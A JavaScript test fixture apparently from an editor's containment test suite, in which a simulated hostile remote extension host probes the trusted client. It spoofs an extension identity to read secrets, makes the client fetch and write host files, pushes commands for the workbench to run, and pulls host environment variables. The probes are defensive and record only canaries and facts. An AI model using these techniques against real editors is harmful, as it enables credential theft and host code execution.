// Rogue REH probes: the server side of the boundary, attacking the client.
//
// Under our threat model the REH server process runs inside the tab, so it is
// hostile. It reaches surfaces the extension host cannot:
//
//   * channels the CLIENT registers on the remote connection and the server
//     calls directly (download, mcpGatewayToolBroker). These never pass through
//     RPCProtocol, so a MainThread*-only filter does not see them at all.
//   * raw MainThread* RPC with arguments no public API would produce, notably a
//     spoofed extension identity.
//
// Loaded by the test-only hook test/containment/rogue-reh/serverServices-hook.patch, which
// only the `containment` test build variant carries (test/builds/variants.json; never
// patches/series). It arms only when the harness stages a run in the tab:
// ~/.seclab-test/rogue-reh/{targets,probes.js,probe-safety.js}, targets holding a per-run
// nonce (arm), the run directory (run) and an expiry (until). It is a fixture, never shipped
// behaviour, and it only ever runs against our own test builds.
//
// Evidence goes to $SECLAB_ROGUE_REH_OUT/reh-probes.json (the hook sets it to
// ~/.seclab-test/rogue-reh/evidence), in the same shape as
// the extension-side probes so check-probes.ts can apply the same rules.

'use strict';

const fs = require('fs');
const path = require('path');
const safety = require('./probe-safety.js');

// Every string in a run record is a source literal (probe-safety.js, run records).
const OUTCOME = { succeeded: safety.lit('succeeded'), denied: safety.lit('denied'), error: safety.lit('error') };
const KIND = {
	safety: safety.lit('safety'), unsupported: safety.lit('unsupported-operation'), timeout: safety.lit('timeout'),
	other: safety.lit('other'), unrecordable: safety.lit('unrecordable-facts'), notArmed: safety.lit('not-armed'),
	noEmitter: safety.lit('no-fixture-emitter'), noWorkspaceId: safety.lit('no-workspace-id'), noPty: safety.lit('no-pty'),
	noRawRpc: safety.lit('no-raw-rpc-hook'), threw: safety.lit('runner-threw'),
};

/** The KIND of failure only, never the message. */
function classify(err) {
	// A safety refusal is a harness fault, never containment.
	if (err && err.seclabSafety) {
		return { outcome: OUTCOME.error, error: KIND.safety };
	}
	const msg = String((err && err.message) || err);
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation|channel not found/i.test(msg)) {
		return { outcome: OUTCOME.denied, error: KIND.unsupported };
	}
	if (/timed out|no reply within/i.test(msg)) {
		return { outcome: OUTCOME.error, error: KIND.timeout };
	}
	return { outcome: OUTCOME.error, error: KIND.other };
}

/** `fn` returns facts (booleans, numbers, canary tokens) or nothing, never a value it read. */
async function probe(results, id, policyRef, fn) {
	const head = { id: safety.lit(id), policyRef: safety.lit(policyRef) }; // lint-allow: lit-probe-head
	try {
		const facts = await fn();
		try {
			safety.record(facts === undefined ? null : facts);
		} catch {
			results.push({ ...head, outcome: OUTCOME.error, error: KIND.unrecordable });
			return;
		}
		results.push({ ...head, outcome: OUTCOME.succeeded, facts: facts === undefined ? null : facts });
	} catch (err) {
		results.push({ ...head, ...classify(err) });
	}
}

/** A result that never ran, for a reason the fixture names. Never DENIED. */
function inconclusive(results, id, policyRef, kind) {
	results.push({ id: safety.lit(id), policyRef: safety.lit(policyRef), outcome: OUTCOME.error, error: kind }); // lint-allow: lit-probe-head
}



const RESOLVE_REF = 'push:remoteterminal:$onPtyHostRequestResolveVariablesEvent';

/**
 * Ask the trusted side to resolve ${env:...} and hand us the values.
 *
 * onPtyHostRequestResolveVariables is a reverse request with argument
 * authority: the pty host names the strings, the workbench resolves them, and
 * the answers come back over acceptPtyHostResolvedVariables. On desktop the
 * resolver is constructed over shellEnvironmentService.getShellEnv(), so
 * `${env:X}` returns the host user's shell environment.
 *
 * Upstream's only guard is `e.workspaceId !== workspace.id`, and the REH is
 * told the workspaceId on every createProcess call, so it is a routing check
 * rather than a boundary. Upstream's resolver needs no live pty; this probe takes the
 * workspaceId from a process the window created, so the run opens one terminal first.
 *
 * The canary is SECLAB_EDITOR_CANARY, which the harness sets only in the
 * editor's launch environment. Getting it back is proof we read the host
 * process environment, not our own: the REH runs in the tab and never has it.
 */
async function runResolveVariablesProbe(results, ctx, socketServer) {
	const channel = terminalChannel(socketServer);
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	const fail = (kind) => inconclusive(results, 'reh-resolve-variables-host-env', RESOLVE_REF, kind);

	if (!svc || typeof svc._resolveVariables !== 'function') {
		// Never DENIED: an absent fixture must not read as containment.
		return fail(KIND.noEmitter);
	}
	const workspaceId = await knownWorkspaceId(svc);
	if (!workspaceId) {
		// Upstream drops the request when it does not match the window workspace, so
		// without one this is inconclusive.
		return fail(KIND.noWorkspaceId);
	}

	await probe(results, 'reh-resolve-variables-host-env', RESOLVE_REF, async () => {
		// Asking only for the canary, through the REH's own request path (the request store
		// times out at 15 s, so a window that never answers is an error, not a denial).
		// ${command:} is not reachable through resolveAsync, so this is read-only by construction.
		const asked = ['${env:SECLAB_EDITOR_CANARY}'];
		const resolved = await svc._resolveVariables(workspaceId, asked);
		if (Array.isArray(resolved) && resolved.length === asked.length && resolved.every((r, i) => r === asked[i])) {
			// Answered with the text unresolved: what a refusing window replies (patch 0031).
			throw new Error('seclab: denied (unresolved)');
		}
		// Only canary tokens are recorded: the host environment's canary reaching the tab is
		// the escape. The REH runs under env -i and never has it.
		return { replied: true, canaryTokens: safety.canaryTokens(resolved) };
	});
}

/**
 * The terminals this REH runs for the window: id and workspaceId, from the pty host's own
 * serialized state (public API; listProcesses() lists only orphans, so it is empty while the
 * window is attached). Ids are small sequential integers; values stay in memory, never recorded.
 */
async function ownedPtys(svc) {
	try {
		const ids = Array.from({ length: 64 }, (_, i) => i + 1);
		const state = JSON.parse(await svc.serializeTerminalState(ids));
		return (state && Array.isArray(state.state) ? state.state : [])
			.filter(t => t && Number.isSafeInteger(t.id))
			.map(t => ({ id: t.id, workspaceId: t.processDetails && typeof t.processDetails.workspaceId === 'string' ? t.processDetails.workspaceId : undefined }));
	} catch {
		return [];
	}
}

/** A workspaceId the window has given this REH, from a terminal it created. */
async function knownWorkspaceId(svc) {
	const owned = captured.find(p => p.workspaceId) || (await ownedPtys(svc)).find(p => p.workspaceId);
	return owned ? owned.workspaceId : undefined;
}

/** The server's own handle on the terminal channel it registered. */
function terminalChannel(socketServer) {
	// ChannelServer keeps its registrations in a private `channels` map, which
	// is an ordinary property at runtime. Reaching it is exactly the liberty a
	// compromised REH has: it is the same process.
	const channels = socketServer && socketServer.channels;
	const get = channels && (channels.get ? (n) => channels.get(n) : (n) => channels[n]);
	return get ? (get('remoteterminal') || get('remoteTerminal')) : undefined;
}

/**
 * Terminals the window asks this REH for from now on, as a hostile REH would learn them: the
 * pty host's createProcess is wrapped to note the id it returns and the workspaceId the window
 * passed (argument 10). In memory only; never recorded.
 */
const captured = [];
function captureCreatedPtys(channel) {
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	if (!svc || typeof svc.createProcess !== 'function' || svc.__seclabCaptured) {
		return;
	}
	const original = svc.createProcess.bind(svc);
	svc.__seclabCaptured = true;
	svc.createProcess = async (...args) => {
		const id = await original(...args);
		if (Number.isSafeInteger(id)) {
			captured.push({ id, workspaceId: typeof args[9] === 'string' ? args[9] : undefined });
		}
		return id;
	};
}

/** Persistent process ids this REH has created, which the window owns. */
async function persistentProcessIds(channel) {
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	return [...new Set([...captured.map(p => p.id), ...(svc ? (await ownedPtys(svc)).map(p => p.id) : [])])];
}

/**
 * Fire onExecuteCommand for each _remoteCLI command on the client's allow list.
 *
 * Each command gets its own probe id and its own facts, so one result can't mask another:
 * on a baseline each must run on the trusted side, and on a patched build each must get the
 * refusal's fixed reply. No marker: the REH can't write a host path, and a reply is the
 * observable fact.
 */
async function runExecuteCommandProbes(results, ctx, socketServer) {
	const channel = terminalChannel(socketServer);
	const emitter = channel && (channel._onExecuteCommand || channel.onExecuteCommandEmitter);

	// Each entry: probe id, command, marker suffix, and how to build its args.
	const vectors = [
		{
			id: 'reh-onexecutecommand-windowopen',
			commandId: '_remoteCLI.windowOpen',
			// Opening a window on a host path is host-side UI acting on our input,
			// and the opened folder is then trusted by the window that opens it.
			args: () => [[], { forceNewWindow: true, folderURIs: [] }],
		},
		{
			id: 'reh-onexecutecommand-manageextensions',
			commandId: '_remoteCLI.manageExtensions',
			// Installing an extension on the trusted side is host code execution.
			// We ask only for a LIST, never an install: the escape is reaching the
			// command at all, and the payload must not also be an attack.
			args: () => [{ list: { showVersions: false } }],
		},
		{
			id: 'reh-onexecutecommand-getsystemstatus',
			commandId: '_remoteCLI.getSystemStatus',
			// Host diagnostics (OS, CPUs, memory, processes) handed to the tab. Read-only. It
			// replaces the openExternal vector, which on a baseline build launches the host's
			// default browser: a window outside the run's control that takes focus.
			args: () => [],
			// Collecting host diagnostics takes several seconds (process lists, remote diagnostics).
			waitMs: 30000,
		},
	];

	if (!emitter || typeof emitter.fire !== 'function') {
		// Not a pass. An absent fixture must never read as containment, so this
		// is ERROR, which check-probes.ts refuses to count as a denial.
		for (const v of vectors) {
			inconclusive(results, v.id, 'push:remoteterminal:$onExecuteCommand', KIND.noEmitter);
		}
		return;
	}

	const ids = await persistentProcessIds(channel);
	if (ids.length === 0) {
		// The client drops the event when it owns no matching pty, so this is inconclusive.
		for (const v of vectors) {
			inconclusive(results, v.id, 'push:remoteterminal:$onExecuteCommand', KIND.noPty);
		}
		return;
	}

	const persistentProcessId = ids[0];
	let reqId = 0x5EC1AB00;
	for (const v of vectors) {
		await probe(results, v.id, 'push:remoteterminal:$onExecuteCommand', async () => {
			const id = reqId++;
			const reply = new Promise((resolve) => {
				// The client answers through sendCommandResult; the server resolves or rejects the
				// pending entry, so a reply is proof the trusted side ran, or refused, the command.
				const pending = channel._pendingCommands;
				if (pending && typeof pending.set === 'function') {
					pending.set(id, { resolve: (payload) => resolve({ ok: true, payload }), reject: (payload) => resolve({ ok: false, payload }), uriTransformer: { transformIncoming: (x) => x } });
				}
				setTimeout(() => resolve(undefined), v.waitMs || 5000);
			});
			emitter.fire({ reqId: id, persistentProcessId, commandId: v.commandId, commandArgs: v.args(ctx) });
			const r = await reply;
			if (!r) {
				throw new Error('timed out: no reply');
			}
			if (!r.ok) {
				// The refusal's reply is a fixed literal (patch 0030); anything else is upstream failing.
				throw new Error(r.payload === 'seclab: denied' ? 'seclab: denied' : 'the command failed');
			}
			const text = typeof r.payload === 'string' ? r.payload : '';
			// Facts only: that it ran, and for the status whether it describes a macOS host (the
			// tab is Linux, so that can only be the host's).
			return { replied: true, ran: true, hostIsMac: /\bDarwin\b|\bmacOS\b/.test(text) };
		});
	}
}

/**
 * @param socketServer the server's SocketServer; getChannel(name, router)
 *   returns a proxy to a channel the CLIENT registered.
 * @param router a StaticRouter selecting the renderer connection.
 */
async function runRehProbes(socketServer, router) {
	const results = [];
	// The tab runs under env -i, so the run arms through the targets file the harness staged
	// beside this payload (the hook has already checked it), never the environment.
	const targets = stagedTargets();
	const ctx = safety.context(targets);
	if (!ctx.armed) {
		return [{ id: safety.lit('harness'), policyRef: safety.lit(''), outcome: OUTCOME.error, error: KIND.notArmed }];
	}
	if (targets.only === 'push') {
		// The server-initiated push proof (patches 0030/0031) runs these alone, after recording
		// what the payload could see (facts only), so an inconclusive run says why.
		captureCreatedPtys(terminalChannel(socketServer));
		await waitForReady(targets.ready);
		await writeDiagnostics(socketServer);
		await runExecuteCommandProbes(results, ctx, socketServer);
		await runResolveVariablesProbe(results, ctx, socketServer);
		return results;
	}

	// --- download channel ----------------------------------------------------
	// DownloadServiceChannel revives BOTH URIs from arguments the server sends,
	// so the trusted side fetches a source we name and writes to a destination
	// we name. Reading a host path we could not otherwise see proves host FS
	// read; writing a marker proves host FS write.
	const download = () => socketServer.getChannel('download', router);
	await probe(results, 'channel-download-host-read', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download-read`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		const landed = fs.existsSync(dest);
		return { landed, canaryTokens: landed ? safety.canaryTokens(fs.readFileSync(dest, 'utf8')) : [] };
	});
	await probe(results, 'channel-download-host-write', 'chan:download', async () => {
		const dest = safety.safeWrite(ctx, `${ctx.marker}.download`, 'download dest');
		safety.note(ctx, dest);
		await download().call('download', [
			{ scheme: 'file', path: safety.safePath(ctx, ctx.canary, 'download source') },
			{ scheme: 'file', path: dest },
		]);
		return { returned: true };
	});

	// --- MCP gateway tool broker --------------------------------------------
	// callToolForServer invokes a tool hosted on the TRUSTED side, which is a
	// host process holding host credentials, with arguments we choose. Only whether
	// a reply came back is recorded.
	const mcp = () => socketServer.getChannel('mcpGatewayToolBroker', router);
	await probe(results, 'channel-mcp-list-servers', 'chan:mcpGatewayToolBroker',
		async () => ({ returned: (await mcp().call('listServers', [{}])) !== undefined }));
	await probe(results, 'channel-mcp-call-tool', 'chan:mcpGatewayToolBroker',
		async () => {
			await mcp().call('callToolForServer', [{
				serverId: process.env.SECLAB_PROBE_MCP_SERVER || 'host-probe',
				toolName: process.env.SECLAB_PROBE_MCP_TOOL || 'run',
				// Marker only. A tool invocation is the escape being demonstrated;
				// the payload must not also be an attack.
				arguments: { command: safety.markerCommand(ctx, '.mcp') },
			}]);
			return { returned: true };
		});

	// --- raw RPC: spoofed extension identity ---------------------------------
	// $getKeys/$getPassword take the extension id as an ARGUMENT, so a hostile
	// host can name a UI-side extension and enumerate, then read, its secrets.
	// No public API can express this, which is why it lives here. Counts and canary
	// tokens only: never a key or a value.
	if (typeof globalThis.__seclabMainThreadRpc === 'function') {
		const rpc = globalThis.__seclabMainThreadRpc;
		await probe(results, 'rpc-secret-identity-spoof', 'rpc:MainThreadSecretState.$getKeys',
			async () => {
				const victim = 'vscode.github-authentication';
				const keys = await rpc('MainThreadSecretState', '$getKeys', [victim]);
				let values = 0;
				const tokens = new Set();
				for (const k of (keys || []).slice(0, 8)) {
					const v = await rpc('MainThreadSecretState', '$getPassword', [victim, k]);
					if (v !== undefined && v !== null) {
						values++;
						safety.canaryTokens(v).forEach(t => tokens.add(t));
					}
				}
				return { keys: (keys || []).length, values, canaryTokens: [...tokens].sort() };
			});
		await probe(results, 'rpc-proxy-auth', 'rpc:MainThreadWorkspace.$lookupAuthorization',
			async () => {
				const auth = await rpc('MainThreadWorkspace', '$lookupAuthorization',
					[{ scheme: 'https', host: 'example.invalid', port: 443 }]);
				return { returned: auth !== undefined && auth !== null, canaryTokens: safety.canaryTokens(auth) };
			});
	} else {
		// Not a pass. An absent hook must never look like containment.
		inconclusive(results, 'rpc-secret-identity-spoof', 'rpc:raw', KIND.noRawRpc);
		inconclusive(results, 'rpc-proxy-auth', 'rpc:raw', KIND.noRawRpc);
	}

	// --- server-initiated terminal callback ----------------------------------
	// onExecuteCommand is the push direction: the SERVER names a command and the
	// trusted workbench runs it. It reaches none of the other enforcement points
	// -- it never crosses RPCProtocol, it arrives on a ChannelClient rather than
	// a ChannelServer, and it carries no origin, so the command taint sees
	// nothing in flight.
	//
	// The client guards on `this._ptys.get(e.persistentProcessId)`, so the event
	// is only honoured for a terminal this window owns. That is why this was a
	// stub for so long. We satisfy it the way a real attacker would: the REH is
	// the thing that creates ptys, so it already knows their ids.
	await runExecuteCommandProbes(results, ctx, socketServer);

	// --- server-initiated variable resolution --------------------------------
	await runResolveVariablesProbe(results, ctx, socketServer);

	return results;
}

/**
 * Wait (bounded) until the harness says the window's terminal is up: it names a workspace file
 * the terminal itself writes. A path outside an absolute, plain form is ignored.
 */
async function waitForReady(ready) {
	if (typeof ready !== 'string' || !/^\/[A-Za-z0-9._\/-]+$/.test(ready)) {
		return;
	}
	for (const until = Date.now() + 180000; Date.now() < until && !fs.existsSync(ready);) {
		await new Promise(r => setTimeout(r, 1000));
	}
	await new Promise(r => setTimeout(r, 3000));
}

/** What the push probes could reach, as booleans and counts, beside the evidence. */
async function writeDiagnostics(socketServer) {
	const channel = terminalChannel(socketServer);
	const svc = channel && (channel._ptyHostService || channel.ptyHostService);
	const facts = {
		channel: !!channel, ptyHostService: !!svc,
		serializeTerminalState: !!svc && typeof svc.serializeTerminalState === 'function',
		resolveVariables: !!svc && typeof svc._resolveVariables === 'function',
		executeCommandEmitter: !!channel && !!(channel._onExecuteCommand || channel.onExecuteCommandEmitter),
		pendingCommands: !!channel && !!channel._pendingCommands,
		captured: captured.length,
		capturedWithWorkspace: captured.filter(p => p.workspaceId).length,
		ownedPtys: svc ? (await ownedPtys(svc)).length : -1,
		ownedWithWorkspace: svc ? (await ownedPtys(svc)).filter(p => p.workspaceId).length : -1,
		serializeThrew: false, stateCount: -1,
	};
	if (svc && typeof svc.serializeTerminalState === 'function') {
		try {
			const st = JSON.parse(await svc.serializeTerminalState(Array.from({ length: 64 }, (_, i) => i + 1)));
			facts.stateCount = st && Array.isArray(st.state) ? st.state.length : -2;
		} catch {
			facts.serializeThrew = true;
		}
	}
	try {
		const out = process.env.SECLAB_ROGUE_REH_OUT;
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-diagnostics.json'), safety.recordJson(facts));
	} catch { /* best effort */ }
}

/** key=value lines from ~/.seclab-test/rogue-reh/targets, beside this payload. */
function stagedTargets() {
	try {
		return Object.fromEntries(fs.readFileSync(path.join(__dirname, 'targets'), 'utf8').split('\n')
			.filter(l => l.includes('=')).map(l => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]));
	} catch {
		return {};
	}
}

async function main(socketServer, router) {
	const out = process.env.SECLAB_ROGUE_REH_OUT;
	if (!out) {
		return;
	}
	let results;
	try {
		// Targets come from the safety context, which derives them from the
		// harness-supplied run directory. Nothing here is read from the
		// environment the tab controls.
		results = await runRehProbes(socketServer, router);
	} catch {
		results = [{ id: safety.lit('harness'), policyRef: safety.lit(''), outcome: OUTCOME.error, error: KIND.threw }];
	}
	try {
		fs.mkdirSync(out, { recursive: true });
		fs.writeFileSync(path.join(out, 'reh-probes.json'), safety.recordJson({ results }));
	} catch { /* evidence is best effort; an unrecordable value writes nothing */ }
}

module.exports = { runRehProbes, main };
